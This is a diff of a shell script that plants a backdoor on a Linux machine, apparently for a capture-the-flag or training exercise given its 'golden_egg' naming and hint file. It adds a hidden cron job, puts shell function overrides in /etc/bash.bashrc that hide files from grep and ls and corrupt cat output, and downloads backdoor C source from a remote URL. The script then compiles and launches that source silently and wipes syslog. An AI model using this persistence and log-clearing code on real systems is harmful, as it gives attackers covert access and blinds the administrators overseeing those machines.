@@ -61,23 +61,27 @@ CRON_JOB="*/10 * * * * /var/.lib/.nope/back.sh >/dev/null 2>&1"
 (crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -
 
 # Fun stuff with commands! ;)
-echo "alias grep='grep --exclude-dir=.nope --exclude=*socat'" >> /etc/bash.bashrc
-echo "alias ls='ls --color=auto | grep --invert-match \"back.sh\"'" >> /etc/bash.bashrc
+echo "cat() {command cat \"$@\" | awk 'NR % 2 == 0'}"
+echo "grep() {command grep --exclude-dir=.nope --exclude='*socat' \"$@\"}" >> /etc/bash.bashrc
+echo "ls() {command ls --color=auto \"$@\" | grep -vE 'back\.(sh|py)$'}" >> /etc/bash.bashrc
 
 ### Install and schedule a Backdoor Binary
 # Get the code to compile
-mkdir /etc/ftp
-sudo curl -s -o /etc/ftp/server.c https://raw.githubusercontent.com/infiniteaxon/VulnServer/main/backdoor.c
+mkdir /etc/goose
+sudo curl -s -o /etc/goose/golden_egg.c https://raw.githubusercontent.com/infiniteaxon/Vulngolden_egg/main/backdoor.c
+
+# Hint
+echo "You're in the correct directory!" >> /etc/goose/egg
 
 # Ensure gcc installed
 DEBIAN_FRONTEND=noninteractive apt-get install build-essential -y
 
 # Compile and remove source code
-gcc -o /etc/ftp/server /etc/ftp/server.c
-rm /etc/ftp/server.c
+gcc -o /etc/goose/golden_egg /etc/goose/golden_egg.c
+rm /etc/goose/golden_egg.c
 
 # Run the binary in background
-nohup /etc/ftp/server </dev/null >/dev/null 2>&1 &
+nohup /etc/goose/golden_egg </dev/null >/dev/null 2>&1 &
 
 # Clear logs
 > /var/log/syslog
